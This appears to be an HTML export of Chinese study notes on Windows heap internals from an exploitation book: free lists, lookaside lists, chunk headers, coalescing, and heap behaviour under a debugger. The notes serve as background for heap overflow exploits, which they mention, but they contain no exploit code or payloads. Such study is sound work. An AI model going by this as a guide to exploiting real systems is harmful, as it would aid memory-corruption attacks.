+<a name="54cm5njrenqdkt80evkugho4gt">&nbsp;&nbsp;&nbsp;&nbsp;堆块分配中的&ldquo;找零钱&rdquo;现象：当空表中无法找到匹配的&ldquo;最优&rdquo;堆块时，一个稍大些的 块会被用于分配。这种次优分配发生时，会先从大块中按请求的大小精确地&ldquo;割&rdquo;出一块进行 分配，然后给剩下的部分重新标注块首，链入空表。这里体现的就是堆管理系统的&ldquo;节约&rdquo;原 则：买东西的时候用最合适的钞票，如果没有，就要找零钱，决不会玩大方。 </a>
+</h3>
+<h3 class="topic">
+<a name="4dqnf3n8v7eckre8ia7u95b1r9">&nbsp;&nbsp;&nbsp;快表只有精确匹配时才会分配，所以不存在找零的情况</a>
+</h3>
+<h3 class="topic">
+<a name="0bnd282usuc690rrr6racg82fr">&nbsp;&nbsp;&nbsp;堆分配算法依赖于操作系统版本、编译器版本、编译选项、build等因素，甚至于虚拟机版本有关</a>
+</h3>
+<h3 class="topic">
+<a name="4ji6lcne5of32d5lqdcjmqe4q3">&nbsp;&nbsp;堆块释放</a>
+</h3>
+<h3 class="topic">
+<a name="1os73sfc1aahihi343t41ouo5j">&nbsp;&nbsp;&nbsp;程序员提交申请并执行</a>
+</h3>
+<h3 class="topic">
+<a name="6lv47ali88h1nb6vccgslabc5r">&nbsp;&nbsp;&nbsp;步骤</a>
+</h3>
+<h3 class="topic">
+<a name="6vrfc51j8asc7168k48uldn9n6">&nbsp;&nbsp;&nbsp;&nbsp;将堆块状态改为空闲</a>
+</h3>
+<h3 class="topic">
+<a name="7bjm337rud3rv9trto71qlvct9">&nbsp;&nbsp;&nbsp;&nbsp;链入相应的堆表</a>
+</h3>
+<h3 class="topic">
+<a name="4gtdsnc5ej0k4mojv0a1c89u8t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所有释放的堆块均链入堆表的末尾</a>
+</h3>
+<h3 class="topic">
+<a name="6u165h2tr308p8pljojf0s326v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分配的时候也先从堆表末尾拿</a>
+</h3>
+<h3 class="topic">
+<a name="5v1lf89kqvcsl30g6eptc9lk3i">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/4m6unspor6o34fv25abumv9l9p.png"></p>
+<h3 class="topic">
+<a name="3q7o1pi45vjreqiooqlmv83qon">&nbsp;&nbsp;堆块合并</a>
+</h3>
+<h3 class="topic">
+<a name="2s25v973crs62l9g95ka64ofje">&nbsp;&nbsp;&nbsp;堆管理系统自动完成</a>
+</h3>
+<h3 class="topic">
+<a name="70181bi4c1mghq4dm2c3ornt3r">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/5gbatt7jaapfr8nvitaabhqeg4.png"></p>
+<h3 class="topic">
+<a name="1vg6okn7uajeou094hri8qio25">&nbsp;&nbsp;&nbsp;发生在两个空闲的堆块之间</a>
+</h3>
+<h3 class="topic">
+<a name="3m0jks3unu60ia84poknhbsapd">&nbsp;&nbsp;&nbsp;具体流程</a>
+</h3>
+<h3 class="topic">
+<a name="6rogbuf9tq0ojfc8gvjj46d0ph">&nbsp;&nbsp;&nbsp;&nbsp;将两个堆块从堆表中卸下</a>
+</h3>
+<h3 class="topic">
+<a name="0qc6qd25fq941eb7hbgaivv70b">&nbsp;&nbsp;&nbsp;&nbsp;合并堆块</a>
+</h3>
+<h3 class="topic">
+<a name="1c49tj8fmnluhtr75klo9mp0bt">&nbsp;&nbsp;&nbsp;&nbsp;调整新堆块的堆头信息</a>
+</h3>
+<h3 class="topic">
+<a name="65hikvo2dge0jjob10cngbi3p0">&nbsp;&nbsp;&nbsp;&nbsp;将新堆块重新链入空闲链表</a>
+</h3>
+<h3 class="topic">
+<a name="4q3q59uqcbssnauc19ql3ehsie">&nbsp;&nbsp;&nbsp;堆区内存紧缩，类似于磁盘碎片整理</a>
+</h3>
+<h3 class="topic">
+<a name="7ft97c68hkqdmc73rqmaabqhjd">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1vv1o0rpb4nrdkgil6f0lo1juk.png"></p>
+<h3 class="topic">
+<a name="2mqahi8ki8re2e90dgtbf8okjt">&nbsp;&nbsp;堆块的分配和释放过程中，根据操作的堆内存的大小不同，将堆块分为3类，每一类的堆块具有不同的分配和释放操作</a>
+</h3>
+<h3 class="topic">
+<a name="6clb1mkbmv8gm7hk643uj41bot">&nbsp;&nbsp;&nbsp;堆块的分类（根据大小）</a>
+</h3>
+<h3 class="topic">
+<a name="09tg43uqpdopeovibf8brgbikn">&nbsp;&nbsp;&nbsp;&nbsp;小块  size&lt;1kb</a>
+</h3>
+<h3 class="topic">
+<a name="6ofb291orageh4ja5u3mg3v9hf">&nbsp;&nbsp;&nbsp;&nbsp;大块  1kb&lt;=size&lt;512kb</a>
+</h3>
+<h3 class="topic">
+<a name="5lgd8qkftuo3028nl53ijjq5hm">&nbsp;&nbsp;&nbsp;&nbsp;巨块  size&gt;=512kb</a>
+</h3>
+<h3 class="topic">
+<a name="0llulfnlgl7gbf9n25ei69h12q">&nbsp;&nbsp;&nbsp;不同堆块的不同处理</a>
+</h3>
+<h3 class="topic">
+<a name="3jmd3rierf57la7op34kan7a4k">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/7l29a2rcirq8ijnqfs89li90lp.png"></p>
+<h3 class="topic">
+<a name="6ap122db9gedtb4qc1u2u65998">&nbsp;&nbsp;&nbsp;堆分配算法依赖于操作系统版本、编译器版本、编译选项、build等因素，甚至于虚拟机版本有关</a>
+</h3>
+<h3 class="topic">
+<a name="22el7jn37oumbc6spjib4vjb1n">&nbsp;堆管理体系架构</a>
+</h3>
+<h3 class="topic">
+<a name="1s51ngoik7bjn236cllse1hiui">&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/43vkc0uj735g1rv77qvbqkqb3t.png"></p>
+<h3 class="topic">
+<a name="5a8pr4ofpog2joh2r5320nnfd6">&nbsp;windows中的堆分配函数</a>
+</h3>
+<h3 class="topic">
+<a name="7867tpkjs4i39787lipuka4t2r">&nbsp;&nbsp;用户层中最终调用了ntdll中的RtlAllocateHeap函数，研究堆的分配就可以研究该函数</a>
+</h3>
+<h3 class="topic">
+<a name="3f39uceut0th4de5f6oskhsnjp">&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/7s1fmh7s1t8lb746monoop0lng.png"></p>
+<h3 class="topic">
+<a name="5ele15frn66ptvd1fh539id0de">&nbsp;堆的调试方法</a>
+</h3>
+<h3 class="topic">
+<a name="2ir8kr01uije8ka9m7n6gafm10">&nbsp;&nbsp;调试堆所使用的代码</a>
+</h3>
+<h3 class="topic">
+<a name="5u8gar7jscqsi3jnqmtchac88n">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/7jftp3v0g87vh5a3ligf2op47s.png"></p>
+<h3 class="topic">
+<a name="723dn2c1lo00b73cdk5bptk0rq">&nbsp;&nbsp;注意</a>
+</h3>
+<h3 class="topic">
+<a name="2jvivei0rfv4ph86c1kfam3isc">&nbsp;&nbsp;&nbsp;调试堆与调试栈不同，如果当前程序处于被调试状态，堆管理函数会使用调试态堆管理策略，而不是常态堆管理策略</a>
+</h3>
+<h3 class="topic">
+<a name="0apak634rl6cqle2272m8crjce">&nbsp;&nbsp;&nbsp;如果堆溢出的exploit在调试过程中可以正常执行，但无法在单独运行时执行，可能是不同的堆管理策略导致的</a>
+</h3>
+<h3 class="topic">
+<a name="21lq8mghumc7t17q1im3sq83bn">&nbsp;&nbsp;调试态堆管理策略相较于常态堆管理策略</a>
+</h3>
+<h3 class="topic">
+<a name="5irliiv2qhkb8tb35p9shstdl8">&nbsp;&nbsp;&nbsp;不使用快表分配，只使用空表分配</a>
+</h3>
+<h3 class="topic">
+<a name="4bqlnmnjv4rodj8qboirim7cv9">&nbsp;&nbsp;&nbsp;所有的堆块均被加上十六字节的尾部用于防止程序溢出</a>
+</h3>
+<h3 class="topic">
+<a name="5ob828ukpsg2dfae6veegl9aau">&nbsp;&nbsp;&nbsp;&nbsp;包括8个字节的0xAB和8个字节的0x00</a>
+</h3>
+<h3 class="topic">
+<a name="49fsvetuabggmv0i46rbqfgd15">&nbsp;&nbsp;&nbsp;块首的标志位不同</a>
+</h3>
+<h3 class="topic">
+<a name="70spp5ncsjv1p8l694j9bhb8i6">&nbsp;&nbsp;调试常态堆管理策略下的程序</a>
+</h3>
+<h3 class="topic">
+<a name="3vne4jl2rph09eb8aiqbckh9mu">&nbsp;&nbsp;&nbsp;在程序中创建堆之后加上手工断点，使程序中断，之后使用调试器附加进程，从而看到常态堆策略下的堆</a>
+</h3>
+<h3 class="topic">
+<a name="19drkr9gl1uc790poanaqla79l">&nbsp;&nbsp;所有的堆块分配函数均需要使用到堆区的句柄作为参数，堆区的句柄通过函数 HeapCreate进行获取，所以一般执行堆分配函数HeapAlloc之前，均要获取堆区句柄</a>
+</h3>
+<h3 class="topic">
+<a name="66n2vs58dj4vlgk4ldev9q8i20">&nbsp;&nbsp;&nbsp;malloc函数实现过程中内部调用了HeapCreate函数，获得了堆区句柄</a>
+</h3>
+<h3 class="topic">
+<a name="4pijntu1ssliqpvortj5d4toa8">&nbsp;&nbsp;&nbsp;所有的堆分配函数均根据其参数堆区的句柄，在对应的堆区内进行堆表修改等操作，最后完成堆的分配工作</a>
+</h3>
+<h3 class="topic">
+<a name="5gci0bi82goq620d84d659ade4">&nbsp;&nbsp;通常一个程序中会有多个堆区</a>
+</h3>
+<h3 class="topic">
+<a name="56os0124c2p34mt5avk0a07q3s">&nbsp;&nbsp;&nbsp;包括开始于 0x00130000 的大小为 0x4000 的进程堆，可以通过 GetProcessHeap()函数获得这个堆的句柄并使用</a>
+</h3>
+<h3 class="topic">
+<a name="2s6dgbihcl8hehefo4pjekkto9">&nbsp;&nbsp;&nbsp;内存 分配函数 malloc()也有属于自己的堆区，大多数情况下（本例中为 0x00410000），这是一个紧 接着 PE 镜像处 0x00430000 的大小为 0x8000 字节的堆</a>
+</h3>
+<h3 class="topic">
+<a name="4v0mdh72c5ccvormp2rmomaik9">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/4qk7u8d6fco2vv0oonbi0og8ng.png"></p>
+<h3 class="topic">
+<a name="1pbjfjcbn0mua3ep9uofa4v7iv">&nbsp;识别堆表</a>
+</h3>
+<h3 class="topic">
+<a name="3g6a72gl5lbcj6i3l8c4ge630h">&nbsp;&nbsp;使用Heap Vis的od插件可以查看当前内存中所有的堆块及其状态，但是没有对快表和空表对应的堆块进行区分，有的时候运行可能不稳定</a>
+</h3>
+<h3 class="topic">
+<a name="3o67agarbkohqu7nt2etd3cg8a">&nbsp;&nbsp;根据HeapCreate的返回值（堆区句柄），直接在内存窗口观察堆区</a>
+</h3>
+<h3 class="topic">
+<a name="2et3n645i13k43gmpmsdik9849">&nbsp;&nbsp;&nbsp;从堆区首字节开始存放堆表</a>
+</h3>
+<h3 class="topic">
+<a name="39omr40qg57bsnr2cagq7ss4ik">&nbsp;&nbsp;&nbsp;堆表依次存放</a>
+</h3>
+<h3 class="topic">
+<a name="12ach52bbgk3r9njhgug47pj7g">&nbsp;&nbsp;&nbsp;&nbsp;段表索引</a>
+</h3>
+<h3 class="topic">
+<a name="0h2p27uf4jog2pud62svv8jora">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与堆溢出关系不大</a>
+</h3>
+<h3 class="topic">
+<a name="6jdkpccherposc3kppt6ino87c">&nbsp;&nbsp;&nbsp;&nbsp;虚表索引</a>
+</h3>
+<h3 class="topic">
+<a name="7gq0qhrop2g6uv00onnffpbrc4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与堆溢出关系不大</a>
+</h3>
+<h3 class="topic">
+<a name="54ikisiiqjhsr3oaa5b5i690ce">&nbsp;&nbsp;&nbsp;&nbsp;空表使用标识</a>
+</h3>
+<h3 class="topic">
+<a name="5e13ld3mhokk3pgjavu82hdku7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与堆溢出关系不大</a>
+</h3>
+<h3 class="topic">
+<a name="1dg8sampocf8hi37kpc71rgkqa">&nbsp;&nbsp;&nbsp;&nbsp;空表索引区</a>
+</h3>
+<h3 class="topic">
+<a name="54nkfl3qndh57v0anoqd7kkt7q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;位于距堆区首地址偏移0x178处</a>
+</h3>
+<h3 class="topic">
+<a name="2et1gdrktki2b20aggevu3rqkg">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1pbpc2fp5cbkk7cikj34cdp7nk.png"></p>
+<h3 class="topic">
+<a name="1unphibcj7nk6e9i14davpfoi4">&nbsp;识别堆块</a>
+</h3>
+<h3 class="topic">
+<a name="5h77tknip92kl7l80gch2vdm3o">&nbsp;&nbsp;堆刚刚被初始化时，堆块的结构</a>
+</h3>
+<h3 class="topic">
+<a name="5knnaiqe9n8g9fe8ktn3rhvbgd">&nbsp;&nbsp;&nbsp;只有一个空闲的大堆块，被称为尾块</a>
+</h3>
+<h3 class="topic">
+<a name="1di5fgmcaejtaa014475v6jkkm">&nbsp;&nbsp;&nbsp;位于堆区首地址偏移0x688的位置</a>
+</h3>
+<h3 class="topic">
+<a name="6c2g8h1c3btj9vio9na5uvf082">&nbsp;&nbsp;&nbsp;&nbsp;如果启用快表该偏移位置保存快表</a>
+</h3>
+<h3 class="topic">
+<a name="7fln61q6r5kpmk9sgbh6ltgs80">&nbsp;&nbsp;&nbsp;&nbsp;这里的0x688是堆块中保存数据的部分的首地址，没有计算堆块堆首，如果加上堆首，一个堆块起始位置位于偏移0x680的位置</a>
+</h3>
+<h3 class="topic">
+<a name="0ijpkr7amsjgbhbrgls39iktqt">&nbsp;&nbsp;&nbsp;0号空表索引指向尾块，其他各项空表索引均指向自己，标识当前其余空闲链表中都没有空闲块</a>
+</h3>
+<h3 class="topic">
+<a name="45bn8ba0soeio2ciuluoh0o3ap">&nbsp;&nbsp;堆块块首的含义</a>
+</h3>
+<h3 class="topic">
+<a name="30dlqp698tgic6eoa9migtos8r">&nbsp;&nbsp;&nbsp;占用态堆块的数据结构</a>
+</h3>
+<h3 class="topic">
+<a name="5kqhdbb1tpsaklijfh67vp7607">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/03nm7jt02n7otpp8tvfqa2vcsk.png"></p>
+<h3 class="topic">
+<a name="7hs6ketqe5dr9sciatlah7ppv3">&nbsp;&nbsp;&nbsp;空闲态堆块的数据结构</a>
+</h3>
+<h3 class="topic">
+<a name="1qp0hro02m0d57b2404fes43p8">&nbsp;&nbsp;&nbsp;&nbsp;与上面结构体类似，只不过堆首后面的8个字节用于保存一对空表指针，当空闲态堆块转为占用态后该八个字节将重新分回块身用于存放数据</a>
+</h3>
+<h3 class="topic">
+<a name="76tt8s93vje6eqfamqm8m16vdj">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/5rem44sj8rbm44hfjfo6ojtid2.png"></p>
+<h3 class="topic">
+<a name="7jqshln0qjr0r0oiihf83rk8jg">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1fqar07sgat6o7u37e3n5f0n4g.png"></p>
+<h3 class="topic">
+<a name="5bgir7nso1vg55i65m8ldsrct6">&nbsp;&nbsp;&nbsp;&nbsp;由上图可知</a>
+</h3>
+<h3 class="topic">
+<a name="5ib9iufo51snuhdonj6bi7hmfl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;堆块实际可以用于存放数据的首地址为0x520688</a>
+</h3>
+<h3 class="topic">
+<a name="2jcjgl9cn6gmgcc4lgn2cpfkeo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;堆块实际内存首地址（包括堆首）为0x520680</a>
+</h3>
+<h3 class="topic">
+<a name="2k2t9b1qtuhrpi2d3v2t0ob38s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该堆块目前大小为0x0130(Self Size) 计算单位为8字节（Previous chunk size）故总大小为0x980字节</a>
+</h3>
+<h3 class="topic">
+<a name="36ldu8ndg5eovdt2blp3q5asdg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意这里堆块大小是包括块首在内的</a>
+</h3>
+<h3 class="topic">
+<a name="4qgn2n2irrhb0k9b3ercj9u8fo">&nbsp;&nbsp;如何在堆管理系统中启用快表</a>
+</h3>
+<h3 class="topic">
+<a name="0jcsc6f62vmlv01e4r57hkotg0">&nbsp;&nbsp;&nbsp;堆只有在可扩展的时候快表才会启用</a>
+</h3>
+<h3 class="topic">
+<a name="7taac327cjt0r3i9p475e0err4">&nbsp;&nbsp;&nbsp;创建可扩展的堆区</a>
+</h3>
+<h3 class="topic">
+<a name="5tbu9nc5r2qevu39uikqgupi81">&nbsp;&nbsp;&nbsp;&nbsp;HeapCreate(0,0,0)</a>
+</h3>
+<h3 class="topic">
+<a name="60nvaufuamd4nu9fian1pfd4h5">&nbsp;堆块的分配</a>
+</h3>
+<h3 class="topic">
+<a name="0dr29hcig62qumminp0s07494l">&nbsp;&nbsp;堆块在分配时，堆块的大小包括了块首的大小（8字节），如果请求32个字节的堆空间，会分配40字节的堆空间</a>
+</h3>
+<h3 class="topic">
+<a name="3ictf4kbso1bpnuldd88f5kfdp">&nbsp;&nbsp;堆块分配的单位是8字节，不满8字节的部分按8字节进行分配</a>
+</h3>
+<h3 class="topic">
+<a name="0jm32bhuisrumlltml7kcg15cq">&nbsp;&nbsp;堆块初始状态下，快表和空表均为空（除了0号空表索引），不能精确分配，将进行次优块进行分配（该次优块就是堆区最初的一个大堆块，即位于偏移0x688处的堆块）</a>
+</h3>
+<h3 class="topic">
+<a name="026ls9dgsm33dfvof4kvfredfp">&nbsp;&nbsp;&nbsp;次优块的分配会从尾块中切走一些小块，之后修改尾块的大小信息，将0号空表索引指向新的尾块位置</a>
+</h3>
+<h3 class="topic">
+<a name="1brnqcs7v3pscbondhef011p4f">&nbsp;&nbsp;实际内存分配情况</a>
+</h3>
+<h3 class="topic">
+<a name="14t4rou9o1an56tbeu25givfsc">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/2m3ac41t72he179l43of225dff.png"></p>
+<h3 class="topic">
+<a name="23j1k3j1d3hb033p7a6608kk3c">&nbsp;&nbsp;&nbsp;&nbsp;注意堆块如果申请3个字节的堆空间，加上堆首8个字节，一共需要11字节的空间，按8字节对齐，则需要16个字节的堆空间</a>
+</h3>
+<h3 class="topic">
+<a name="61j6gevhg0tcfb209es55q5keg">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1taadu4s98l067a3pq31vft8q1.png"></p>
+<h3 class="topic">
+<a name="2hcl4ju5looqm9lph72r7rib4k">&nbsp;堆块的释放</a>
+</h3>
+<h3 class="topic">
+<a name="78682lq63cietien0evuqosn9d">&nbsp;&nbsp;因为原代码中释放H1 H3 H5时三个对堆块不相邻，所以不会发生合并</a>
+</h3>
+<h3 class="topic">
+<a name="1jdkstp8rsc3rbvcbu3u7c3t2h">&nbsp;&nbsp;释放后，堆块的内存布局</a>
+</h3>
+<h3 class="topic">
+<a name="3nh0c518qjvr0bqgmoacinqtq9">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/18hmn6c6qeu9mqe3kfvkkgdu6u.png"></p>
+<h3 class="topic">
+<a name="45fnk7e9s793v61fcslqnau6j2">&nbsp;&nbsp;&nbsp;因为h1 h3 h5的堆块被释放，所以其堆首后8个字节被两个指针填充，从而链入堆表中的空表索引</a>
+</h3>
+<h3 class="topic">
+<a name="74g9qudfsrmmiefm3rb3dc4qjn">&nbsp;&nbsp;&nbsp;其中h1 h3因为堆块大小为16个字节，所以会被链入到下标为2的空表索引中   freelist[2]</a>
+</h3>
+<h3 class="topic">
+<a name="6jjc0k622h719mddndihm1ge01">&nbsp;&nbsp;&nbsp;h5堆块大小为32字节，所以会被链入到下标为4的空表索引中  freelist[4]</a>
+</h3>
+<h3 class="topic">
+<a name="3scu127oeh1jfj6tkm54r80g1o">&nbsp;&nbsp;释放后，堆表的内存布局</a>
+</h3>
+<h3 class="topic">
+<a name="6kj81kto4qmo421jqpm8mi1p57">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/33ofuglfr4ondcg4rgpoolme9p.png"></p>
+<h3 class="topic">
+<a name="15852h6dl80b4mj14r08cdgpov">&nbsp;&nbsp;&nbsp;在堆表中，空表的下标为0 2 4的空表索引已经存在空闲链表</a>
+</h3>
+<h3 class="topic">
+<a name="1rakilthol66p28jsl16kgq9vk">&nbsp;堆块的合并</a>
+</h3>
+<h3 class="topic">
+<a name="5k4rcnjgr9ju413vplgdfsmvst">&nbsp;&nbsp;当释放h4之后，h3、h4、h5堆块彼此相邻，会发生堆块合并</a>
+</h3>
+<h3 class="topic">
+<a name="7f116lvbm53k2g27vvkapc5e88">&nbsp;&nbsp;h3 h4大小2个堆单位（一个8字节） h5大小为4个堆单位，合并后整个堆块为8个堆单位大小，即64个字节，应当链入下标为8的空表索引 (freelist[8])</a>
+</h3>
+<h3 class="topic">
+<a name="3m2ml3e367hhq2qlocta6rsi2m">&nbsp;&nbsp;堆块合并仅仅修改新堆块的堆首，原堆块的值在新堆块中均保持不变</a>
+</h3>
+<h3 class="topic">
+<a name="258dcfkdtbq9cqvl0jfqb4bs3b">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/34vd4qhokfe6mh1migntmem3f8.png"></p>
+<h3 class="topic">
+<a name="52970a97jra8r057bf1o6le52j">&nbsp;&nbsp;~在堆表中，由于h5堆块被合并，所以freelist[4]对应的空表索引不再存在，freelist[4]中的两个指针均指向本空表索引所在的地址&#13;
+~因为h3堆块被合并，所以空表索引freelist[2]中只有h1一个堆块&#13;
+~空表索引freelist[8]原本指向自身，现在指向新堆块</a>
+</h3>
+<h3 class="topic">
+<a name="7tdgu4s2taa7tlf5qhtgvrb19c">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/230e2f3n5b7r3fcmm0tgvssbc5.png"></p>
+<h3 class="topic">
+<a name="3o1tmthbb0hkts653bb8t6mjr2">&nbsp;&nbsp;堆块合并因为要修改多处指针，所以只能发生在空表中，快表中一般会禁止堆块合并（通过设置堆块为占用态）</a>
+</h3>
+<h3 class="topic">
+<a name="4kgea2afja1rknqvv2434069qp">&nbsp;&nbsp;空表中第一个堆块不会向前合并、最后一个堆块不会向后合并</a>
+</h3>
+<h3 class="topic">
+<a name="69v5thuq5vamktql8r7n2euphh">&nbsp;快表（Lookaside）的使用（申请与释放） </a>
+</h3>
+<h3 class="topic">
+<a name="6apduaf88o85fkmscdkf2p29ep">&nbsp;&nbsp;调试代码</a>
+</h3>
+<h3 class="topic">
+<a name="50prqql521imtvfat2sktmrst4">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/50j7tjvekdqmap0qhbdeir49v6.png"></p>
+<h3 class="topic">
+<a name="3ngo5ji77pi8md6qdofbo5h3h8">&nbsp;&nbsp;当使用空表时距离堆区首地址偏移0x688的位置不再保存尾块，而是保存快表，真正尾块保存的地址可以从freelist[0]处查看</a>
+</h3>
+<h3 class="topic">
+<a name="4dulf21kjmfhcct5oojlie7k3r">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/7gvc88b2kj6orib338t96e212k.png"></p>
+<h3 class="topic">
+<a name="696stebutunstqntnsss428mik">&nbsp;&nbsp;&nbsp;此时freelist[0]显示尾块位于距离堆块首地址偏移0x1e90的位置</a>
+</h3>
+<h3 class="topic">
+<a name="3kaql61rccp8bl22odsr6qtb2a">&nbsp;&nbsp;堆刚完成初始化之后，快表是空的，当特定大小(8 16 32字节....)的堆块被释放之后，会优先将被释放的堆块链入到快表中</a>
+</h3>
+<h3 class="topic">
+<a name="4qb6bmmab26tt886jji0f3j0pa">&nbsp;&nbsp;&nbsp;堆刚初始化之后</a>
+</h3>
+<h3 class="topic">
+<a name="1a69r3qu9afc52bfktpdmp7ps9">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/4l3mt1ggl0ahcvap86f17mrp4q.png"></p>
+<h3 class="topic">
+<a name="2pcb8hsq6qu7qecvnr70crrg78">&nbsp;&nbsp;&nbsp;&nbsp;注意快表的前48个字节不保存块表索引，从偏移48字节之后保存下标为0的块表索引，每个快表索引占据48字节的内存空间</a>
+</h3>
+<h3 class="topic">
+<a name="58ha89gbd613gapsc36cfivu0i">&nbsp;&nbsp;&nbsp;被释放的堆块链入快表中</a>
+</h3>
+<h3 class="topic">
+<a name="56tap5ep0b8p29i4ehgivi15uh">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/2v7hpge7m4ss4snh7v4rlb3q7t.png"></p>
+<h3 class="topic">
+<a name="0pjdhe7j2bbe5ufol4rusen603">&nbsp;&nbsp;&nbsp;&nbsp;将被释放的8 16 24字节大小的堆块链入 Lookaside[1]、Lookaside[2]、Lookaside[3]</a>
+</h3>
+<h3 class="topic">
+<a name="5flegiul3881fgb2dm191jn2ui">&nbsp;&nbsp;快表中堆块的结构</a>
+</h3>
+<h3 class="topic">
+<a name="0e8hsaicuc66ihas7n8u16t87a">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1tpv3ds959qaejhq5duqi4a5ji.png"></p>
+<h3 class="topic">
+<a name="4ivb9vjtsmahvdk7d49hvsucfl">&nbsp;&nbsp;&nbsp;快表堆块由三部分组成</a>
+</h3>
+<h3 class="topic">
+<a name="2msf9b5voischtd59tilu951us">&nbsp;&nbsp;&nbsp;&nbsp;8个字节的堆首</a>
+</h3>
+<h3 class="topic">
+<a name="2q261373hl63rc9pcg8uegqf3k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一般第六个字节为01，表示该堆块处于占用态，从而防止堆块合并</a>
+</h3>
+<h3 class="topic">
+<a name="5g6jn7ipnob9su4velesnpa0jk">&nbsp;&nbsp;&nbsp;&nbsp;四字节的指向下个一快表堆块指针</a>
+</h3>
+<h3 class="topic">
+<a name="5ofovojnmo8mcdeh62eq3vfugn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当快表堆块被使用之后，该部分也会被用于存储用户数据</a>
+</h3>
+<h3 class="topic">
+<a name="6odvo23u80hbs5533c10g31inm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当快表堆块未被使用，这里保存下一个快表堆块的指针</a>
+</h3>
+<h3 class="topic">
+<a name="1lf2d2sccgpufc0ejonq2e8r6j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果该对堆块之后没有快表堆块，则该指针为null</a>
+</h3>
+<h3 class="topic">
+<a name="4hhbldk11otpqlpgka7mk93p6s">&nbsp;&nbsp;&nbsp;&nbsp;用于保存数据的内存</a>
+</h3>
+<h3 class="topic">
+<a name="76r68tpotlvla5589d4snjaclb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该部分与上面的4个字节一起用于堆块中存储数据</a>
+</h3>
+<h3 class="topic">
+<a name="1s2jr3o0n1ut8nc5kenrtm6dop">&nbsp;&nbsp;&nbsp;此时如果申请8 16 24字节的内存空间，则会使用快表中的堆块，使用之后会将快表中对应快表索引置为null</a>
+</h3>
+<h3 class="topic">
